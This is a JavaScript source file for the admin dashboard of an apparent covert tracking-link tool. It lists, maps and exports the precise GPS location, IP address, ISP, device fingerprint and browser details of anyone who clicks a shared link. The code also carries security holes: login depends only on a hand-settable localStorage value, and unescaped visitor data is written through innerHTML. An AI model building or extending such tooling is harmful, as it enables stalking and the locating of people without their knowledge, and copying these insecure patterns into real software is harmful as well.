// Admin Dashboard JavaScript

// DOM Elements
const loginScreen = document.getElementById('loginScreen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('loginForm');
const loginError = document.getElementById('loginError');
const logoutBtn = document.getElementById('logoutBtn');
const refreshBtn = document.getElementById('refreshBtn');
const exportBtn = document.getElementById('exportBtn');
const tracksList = document.getElementById('tracksList');
const searchInput = document.getElementById('searchInput');
const filterType = document.getElementById('filterType');

// State
let allTracks = [];
let map = null;
let markers = [];
let isAuthenticated = false;

// Check if already logged in
function checkAuth() {
    const token = localStorage.getItem('adminToken');
    if (token === 'authenticated') {
        showDashboard();
    }
}

// Handle login
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    try {
        const response = await fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        
        const result = await response.json();
        
        if (result.success) {
            localStorage.setItem('adminToken', 'authenticated');
            showDashboard();
        } else {
            loginError.textContent = '❌ Invalid credentials';
        }
    } catch (error) {
        loginError.textContent = '❌ Login failed. Please try again.';
    }
});

// Show dashboard
function showDashboard() {
    isAuthenticated = true;
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');
    initializeMap();
    loadData();
}

// Handle logout
logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('adminToken');
    location.reload();
});

// Initialize map
function initializeMap() {
    map = L.map('map').setView([20, 0], 2);
    
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors',
        maxZoom: 18
    }).addTo(map);
}

// Load tracking data
async function loadData() {
    try {
        const response = await fetch('/api/admin/tracks');
        const data = await response.json();
        
        if (data.success) {
            allTracks = data.tracks;
            updateStats(data.stats);
            displayTracks(allTracks);
            updateMap(allTracks);
        }
    } catch (error) {
        console.error('Failed to load data:', error);
    }
}

// Update statistics cards
function updateStats(stats) {
    document.getElementById('totalTracks').textContent = stats.totalTracks;
    document.getElementById('uniqueDevices').textContent = stats.uniqueDevices;
    document.getElementById('gpsSuccess').textContent = `${stats.gpsSuccessRate}%`;
    document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
}

// Update map with markers
function updateMap(tracks) {
    // Clear existing markers
    markers.forEach(marker => map.removeLayer(marker));
    markers = [];
    
    const bounds = [];
    
    tracks.forEach(track => {
        let lat, lon, label;
        
        // Prefer GPS location, fallback to IP location
        if (track.latitude && track.longitude) {
            lat = track.latitude;
            lon = track.longitude;
            label = '🛰️ GPS';
        } else if (track.ipLocation && track.ipLocation.latitude) {
            lat = track.ipLocation.latitude;
            lon = track.ipLocation.longitude;
            label = '📡 IP';
        } else {
            return; // Skip if no location data
        }
        
        const marker = L.marker([lat, lon]).addTo(map);
        
        const popupContent = `
            <div style="min-width: 200px;">
                <strong>${label} Location</strong><br>
                <strong>Time:</strong> ${formatDate(track.timestamp)}<br>
                <strong>Device:</strong> ${track.deviceInfo?.fingerprint || 'Unknown'}<br>
                ${track.ipLocation ? `<strong>IP:</strong> ${track.ipLocation.ip}<br>` : ''}
                ${track.ipLocation ? `<strong>Location:</strong> ${track.ipLocation.city}, ${track.ipLocation.country}<br>` : ''}
                <strong>Coords:</strong> ${lat.toFixed(6)}, ${lon.toFixed(6)}
            </div>
        `;
        
        marker.bindPopup(popupContent);
        markers.push(marker);
        bounds.push([lat, lon]);
    });
    
    // Fit map to show all markers
    if (bounds.length > 0) {
        map.fitBounds(bounds, { padding: [50, 50] });
    }
}

// Display tracks in list
function displayTracks(tracks) {
    if (tracks.length === 0) {
        tracksList.innerHTML = `
            <div class="empty-state">
                <h3>📭 No tracks yet</h3>
                <p>Tracks will appear here once someone clicks your tracking link</p>
            </div>
        `;
        return;
    }
    
    tracksList.innerHTML = tracks.map(track => createTrackHTML(track)).join('');
}

// Create HTML for a single track
function createTrackHTML(track) {
    const hasGPS = track.latitude && track.longitude;
    const hasIP = track.ipLocation && track.ipLocation.ip;
    
    return `
        <div class="track-item">
            <div class="track-header">
                <div>
                    <span class="track-id">🔍 ${track.id}</span>
                    ${hasGPS ? '<span class="badge badge-success">GPS ✓</span>' : '<span class="badge badge-warning">IP Only</span>'}
                </div>
                <span class="track-timestamp">⏰ ${formatDate(track.timestamp)}</span>
            </div>
            
            <div class="track-details">
                ${hasGPS ? `
                <div class="detail-group">
                    <h4>🛰️ GPS Location (Precise)</h4>
                    <p><strong>Latitude:</strong> ${track.latitude.toFixed(6)}</p>
                    <p><strong>Longitude:</strong> ${track.longitude.toFixed(6)}</p>
                    <p><strong>Accuracy:</strong> ±${Math.round(track.accuracy || 0)} meters</p>
                    <a href="https://www.google.com/maps?q=${track.latitude},${track.longitude}" 
                       target="_blank" class="map-link">📍 Open in Google Maps</a>
                </div>
                ` : ''}
                
                ${hasIP ? `
                <div class="detail-group">
                    <h4>📡 IP-Based Location</h4>
                    <p><strong>IP:</strong> ${track.ipLocation.ip}</p>
                    <p><strong>Location:</strong> ${track.ipLocation.city}, ${track.ipLocation.region}, ${track.ipLocation.country}</p>
                    <p><strong>ISP:</strong> ${track.ipLocation.isp}</p>
                    <p><strong>Coords:</strong> ${track.ipLocation.latitude}, ${track.ipLocation.longitude}</p>
                </div>
                ` : ''}
                
                <div class="detail-group">
                    <h4>📱 Device Information</h4>
                    <p><strong>Fingerprint:</strong> ${track.deviceInfo?.fingerprint || 'N/A'}</p>
                    <p><strong>Platform:</strong> ${track.deviceInfo?.platform || 'Unknown'}</p>
                    <p><strong>Browser:</strong> ${getBrowserName(track.deviceInfo?.userAgent)}</p>
                    <p><strong>Screen:</strong> ${track.deviceInfo?.screenResolution || 'N/A'}</p>
                    <p><strong>Timezone:</strong> ${track.deviceInfo?.timezone || 'N/A'}</p>
                </div>
                
                <div class="detail-group">
                    <h4>🔗 Visit Information</h4>
                    <p><strong>Page URL:</strong> ${track.pageUrl || 'N/A'}</p>
                    <p><strong>Referrer:</strong> ${track.referrer || 'Direct'}</p>
                    <p><strong>Language:</strong> ${track.deviceInfo?.language || 'N/A'}</p>
                </div>
            </div>
        </div>
    `;
}

// Format date nicely
function formatDate(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMs / 3600000);
    const diffDays = Math.floor(diffMs / 86400000);
    
    if (diffMins < 1) return 'Just now';
    if (diffMins < 60) return `${diffMins} min${diffMins > 1 ? 's' : ''} ago`;
    if (diffHours < 24) return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;
    if (diffDays < 7) return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;
    
    return date.toLocaleString();
}

// Get browser name from user agent
function getBrowserName(userAgent) {
    if (!userAgent) return 'Unknown';
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('Opera')) return 'Opera';
    return 'Other';
}

// Search and filter functionality
searchInput.addEventListener('input', filterTracks);
filterType.addEventListener('change', filterTracks);

function filterTracks() {
    const searchTerm = searchInput.value.toLowerCase();
    const filter = filterType.value;
    
    let filtered = allTracks;
    
    // Apply type filter
    if (filter === 'gps') {
        filtered = filtered.filter(t => t.latitude && t.longitude);
    } else if (filter === 'ip') {
        filtered = filtered.filter(t => !(t.latitude && t.longitude));
    } else if (filter === 'today') {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        filtered = filtered.filter(t => new Date(t.timestamp) >= today);
    } else if (filter === 'week') {
        const weekAgo = new Date();
        weekAgo.setDate(weekAgo.getDate() - 7);
        filtered = filtered.filter(t => new Date(t.timestamp) >= weekAgo);
    }
    
    // Apply search filter
    if (searchTerm) {
        filtered = filtered.filter(track => {
            const searchableText = JSON.stringify(track).toLowerCase();
            return searchableText.includes(searchTerm);
        });
    }
    
    displayTracks(filtered);
    updateMap(filtered);
}

// Refresh data
refreshBtn.addEventListener('click', () => {
    loadData();
    refreshBtn.textContent = '✅ Refreshed';
    setTimeout(() => {
        refreshBtn.textContent = '🔄 Refresh';
    }, 2000);
});

// Export data
exportBtn.addEventListener('click', async () => {
    try {
        const response = await fetch('/api/admin/export');
        const data = await response.json();
        
        // Create downloadable file
        const blob = new Blob([JSON.stringify(data.tracks, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tracking-data-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        exportBtn.textContent = '✅ Exported';
        setTimeout(() => {
            exportBtn.textContent = '📥 Export';
        }, 2000);
    } catch (error) {
        console.error('Export failed:', error);
        alert('Export failed. Please try again.');
    }
});

// Auto-refresh every 30 seconds
setInterval(() => {
    if (isAuthenticated) {
        loadData();
    }
}, 30000);

// Initialize
checkAuth();

